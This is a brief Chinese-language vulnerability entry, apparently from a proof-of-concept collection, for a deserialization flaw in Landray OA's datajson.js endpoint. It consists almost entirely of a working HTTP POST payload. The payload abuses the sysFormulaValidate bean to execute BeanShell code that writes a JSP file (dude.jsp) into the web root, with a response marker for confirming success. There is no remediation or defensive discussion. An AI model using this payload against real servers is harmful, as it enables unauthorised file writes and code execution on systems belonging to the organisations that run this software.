# 蓝凌OAdatajson.js存在反序列化漏洞

蓝凌 ｜ 反序列化 ｜ —
- **请求**：`POST /data/sys-common/datajson.js HTTP/1.1`

**Payload**
```
s_bean=sysFormulaValidate&script=import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass("bsh.Interpreter");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split("WEB-INF")[0]%2B"/dude.jsp");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer("RHVkZQ=="));fout.close();return%201;&type=int&modelName=test
```
- **响应特征**：-1 校验通过